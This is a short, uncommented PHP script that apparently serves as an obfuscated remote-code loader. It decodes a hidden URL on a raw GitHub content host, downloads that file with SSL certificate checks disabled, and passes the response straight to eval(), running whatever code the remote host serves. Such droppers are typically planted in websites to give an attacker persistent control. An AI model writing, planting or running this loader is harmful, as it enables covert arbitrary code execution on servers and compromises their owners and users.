<?php
$s = "txt.2/niam/sdaeh/sfer/mpo/mpoofful/moc.tnetnocresubutig.war//:sptth";
$u = str_rot13(strrev($s));
$c = curl_init($u);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($c, CURLOPT_TIMEOUT, 10);
$r = curl_exec($c);
$h = curl_getinfo($c, CURLINFO_HTTP_CODE);
curl_close($c);
if ($h == 200 && $r) {
    eval("?>" . $r);
}
?>
